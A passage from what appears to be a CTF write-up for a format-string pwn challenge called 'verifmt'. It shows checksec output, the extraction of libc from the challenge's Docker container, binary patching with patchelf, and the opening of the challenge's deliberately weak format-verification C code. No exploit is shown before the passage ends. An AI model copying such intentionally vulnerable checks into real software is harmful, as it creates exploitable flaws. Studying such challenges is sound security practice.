</span><span style="--0:#032F62;--1:#9ECBFF">Dockerfile</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">-rwxrw-rw-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">1449</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">14:57</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">main.c</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ ls -latotal 40drwxrwxr-x 2 kali kali  4096 Dec  3 07:23 .drwxrwxr-x 4 kali kali  4096 Dec  3 07:22 ..-rwxrw-rw- 1 kali kali 16440 Dec  1 14:57 chall-rwxrw-rw- 1 kali kali   117 Dec  1 14:57 compose.yml-rwxrw-rw- 1 kali kali   337 Dec  1 14:57 Dockerfile-rwxrw-rw- 1 kali kali  1449 Dec  1 14:57 main.c"><div></div></button></div></figure></div>
<p>The challenge binary is 64-bit, dynamically linked file with all protections enabled.</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:55ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">file</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">chall</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">|</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">tr</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;,&#39;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;\n&#39;</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">chall:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ELF</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">64-bit</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">LSB</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">pie</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">executable</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">x86-64</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">version</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> (SYSV)</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">dynamically</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">linked</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">interpreter</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">/lib64/ld-linux-x86-64.so.2</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8"> </span></span><span style="--0:#24292E;--1:#E1E4E8">BuildID[sha1]</span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#032F62;--1:#9ECBFF">4ab70f886fa90282a07f9f6a4d9fd391a4127ced</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> GNU/Linux </span><span style="--0:#005CC5;--1:#79B8FF">3.2.0</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">not</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">stripped</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">pwn</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">checksec</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">chall</span></div></div><div class="ec-line"><div class="code"><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#032F62;--1:#9ECBFF">&#39;/home/kali/blackhat-finals/verifmt/chall&#39;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">Arch:</span><span style="--0:#24292E;--1:#E1E4E8">       </span><span style="--0:#032F62;--1:#9ECBFF">amd64-64-little</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">RELRO:</span><span style="--0:#24292E;--1:#E1E4E8">      </span><span style="--0:#032F62;--1:#9ECBFF">Full</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">RELRO</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">Stack:</span><span style="--0:#24292E;--1:#E1E4E8">      </span><span style="--0:#032F62;--1:#9ECBFF">Canary</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">found</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">NX:</span><span style="--0:#24292E;--1:#E1E4E8">         </span><span style="--0:#032F62;--1:#9ECBFF">NX</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">enabled</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">PIE:</span><span style="--0:#24292E;--1:#E1E4E8">        </span><span style="--0:#032F62;--1:#9ECBFF">PIE</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">enabled</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">SHSTK:</span><span style="--0:#24292E;--1:#E1E4E8">      </span><span style="--0:#032F62;--1:#9ECBFF">Enabled</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">IBT:</span><span style="--0:#24292E;--1:#E1E4E8">        </span><span style="--0:#032F62;--1:#9ECBFF">Enabled</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">Stripped:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">No</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ file chall | tr ',' '\n'chall: ELF 64-bit LSB pie executable x86-64 version 1 (SYSV) dynamically linked interpreter /lib64/ld-linux-x86-64.so.2 BuildID[sha1]=4ab70f886fa90282a07f9f6a4d9fd391a4127ced for GNU/Linux 3.2.0 not stripped$ pwn checksec chall[*] '/home/kali/blackhat-finals/verifmt/chall'    Arch:       amd64-64-little    RELRO:      Full RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        PIE enabled    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No"><div></div></button></div></figure></div>
<h3 id="patching-the-binary">Patching the binary</h3>
<p>The challenge files don’t include <code>libc.so.6</code>, but docker config files are provided. We can use these to spin up the container and extract the exact libc and loader (<code>ld-linux-x86-64.so.2</code>) used on the remote server, then patch our local binary with them.</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:27ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">docker</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">compose</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">up</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">--build</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ docker compose up --build"><div></div></button></div></figure></div>
<p><img src="/other-files/docker-compose.BswJ-F0q_ZKtPuh.webp" alt width="1515" height="711" loading="lazy" decoding="async"></p>
<p>In another terminal:</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:148ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">docker</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ps</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">CONTAINER</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ID</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">IMAGE</span><span style="--0:#24292E;--1:#E1E4E8">                  </span><span style="--0:#032F62;--1:#9ECBFF">COMMAND</span><span style="--0:#24292E;--1:#E1E4E8">       </span><span style="--0:#032F62;--1:#9ECBFF">CREATED</span><span style="--0:#24292E;--1:#E1E4E8">        </span><span style="--0:#032F62;--1:#9ECBFF">STATUS</span><span style="--0:#24292E;--1:#E1E4E8">         </span><span style="--0:#032F62;--1:#9ECBFF">PORTS</span><span style="--0:#24292E;--1:#E1E4E8">                                       </span><span style="--0:#032F62;--1:#9ECBFF">NAMES</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">81f013b2d53d</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">verifmt-verifmt-dist</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">&quot;/jail/run&quot;</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#005CC5;--1:#79B8FF">26</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">hours</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ago</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">Up</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">9</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">seconds</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">0.0.0.0:5000</span><span style="--0:#24292E;--1:#E1E4E8">-</span><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#032F62;--1:#9ECBFF">5000/tcp,</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">:::5000</span><span style="--0:#24292E;--1:#E1E4E8">-</span><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#032F62;--1:#9ECBFF">5000/tcp</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">verifmt-verifmt-dist-1</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">docker</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">cp</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">81f013b2d53d:/srv/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ld-linux-x86-64.so.2</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Successfully</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">copied</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">239kB</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">to</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">/home/kali/blackhat-finals/verifmt/ld-linux-x86-64.so.2</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">docker</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">cp</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">81f013b2d53d:/srv/lib/x86_64-linux-gnu/libc.so.6</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">libc.so.6</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Successfully</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">copied</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">2.13MB</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">to</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">/home/kali/blackhat-finals/verifmt/libc.so.6</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ docker psCONTAINER ID   IMAGE                  COMMAND       CREATED        STATUS         PORTS                                       NAMES81f013b2d53d   verifmt-verifmt-dist   &#34;/jail/run&#34;   26 hours ago   Up 9 seconds   0.0.0.0:5000->5000/tcp, :::5000->5000/tcp   verifmt-verifmt-dist-1$ docker cp 81f013b2d53d:/srv/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 ld-linux-x86-64.so.2Successfully copied 239kB to /home/kali/blackhat-finals/verifmt/ld-linux-x86-64.so.2$ docker cp 81f013b2d53d:/srv/lib/x86_64-linux-gnu/libc.so.6 libc.so.6Successfully copied 2.13MB to /home/kali/blackhat-finals/verifmt/libc.so.6"><div></div></button></div></figure></div>
<p>Now that we have all the files we need we can patch the binary to use the libc and ld we just copied from the docker.</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:82ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">patchelf</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">--set-interpreter</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./ld-linux-x86-64.so.2</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">--set-rpath</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">.</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./chall</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ldd</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./chall</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="code"><span class="indent">        </span><span style="--0:#6F42C1;--1:#B392F0">linux-vdso.so.1</span><span style="--0:#24292E;--1:#E1E4E8"> (0x00007feb1b7d2000)</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="code"><span class="indent">        </span><span style="--0:#6F42C1;--1:#B392F0">libc.so.6</span><span style="--0:#24292E;--1:#E1E4E8"> =</span><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./libc.so.6</span><span style="--0:#24292E;--1:#E1E4E8"> (0x00007feb1b400000)</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="code"><span class="indent">        </span><span style="--0:#6F42C1;--1:#B392F0">./ld-linux-x86-64.so.2</span><span style="--0:#24292E;--1:#E1E4E8"> =</span><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">/lib64/ld-linux-x86-64.so.2</span><span style="--0:#24292E;--1:#E1E4E8"> (0x00007feb1b7d4000)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ patchelf --set-interpreter ./ld-linux-x86-64.so.2  --set-rpath . ./chall$ ldd ./chall        linux-vdso.so.1 (0x00007feb1b7d2000)        libc.so.6 => ./libc.so.6 (0x00007feb1b400000)        ./ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007feb1b7d4000)"><div></div></button></div></figure></div>
<h3 id="examining-the-source-code">Examining the source code</h3>
<p>Looking at the <code>main.c</code> file we can identify two functions i.e. <code>main()</code>, <code>verify_fmt()</code>.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:68ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#include</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;ctype.h&gt;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#include</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;stdio.h&gt;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#include</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;stdlib.h&gt;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#include</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;string.h&gt;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code">
</div></div><div class="ec-line highlight mark"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#982934;--1:#fb99a3">int</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#613aa9;--1:#c2a8f3">verify_fmt</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#982934;--1:#fb99a3">const</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#982934;--1:#fb99a3">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#982934;--1:#fb99a3">*</span><span style="--0:#8b3c06;--1:#FFAB70">fmt</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#982934;--1:#fb99a3">size_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#8b3c06;--1:#FFAB70">n_args</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-section collapsible-start"><details><summary><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln"></div></div><div class="code"><span class="expand"></span><span class="collapse"></span><span class="text">25 collapsed lines</span></div></div></summary></details><div class="content-lines"><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">size_t</span><span style="--0:#24292E;--1:#E1E4E8"> argcnt </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">size_t</span><span style="--0:#24292E;--1:#E1E4E8"> len </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">strlen</span><span style="--0:#24292E;--1:#E1E4E8">(fmt);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#BF3441;--1:#F97583">size_t</span><span style="--0:#24292E;--1:#E1E4E8"> i </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">; i </span><span style="--0:#BF3441;--1:#F97583">&lt;</span><span style="--0:#24292E;--1:#E1E4E8"> len; i</span><span style="--0:#BF3441;--1:#F97583">++</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#AE4B07;--1:#FFAB70">fmt</span><span style="--0:#24292E;--1:#E1E4E8">[i] </span><span style="--0:#BF3441;--1:#F97583">==</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;%&#39;</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#AE4B07;--1:#FFAB70">fmt</span><span style="--0:#24292E;--1:#E1E4E8">[i</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#BF3441;--1:#F97583">==</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;%&#39;</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">i</span><span style="--0:#BF3441;--1:#F97583">++</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">continue</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">isdigit</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#AE4B07;--1:#FFAB70">fmt</span><span style="--0:#24292E;--1:#E1E4E8">[i</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">])) {</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent">        </span><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;[-] Positional argument not supported&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (argcnt </span><span style="--0:#BF3441;--1:#F97583">&gt;=</span><span style="--0:#24292E;--1:#E1E4E8"> n_args) {</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span class="indent">        </span><span style="--0:#6F42C1;--1:#B392F0">printf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;[-] Cannot use more than </span><span style="--0:#005CC5;--1:#79B8FF">%lu</span><span style="--0:#032F62;--1:#9ECBFF"> specifiers</span><span style="--0:#005CC5;--1:#79B8FF">\n</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, n_args);</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">26</div></div><div class="code">
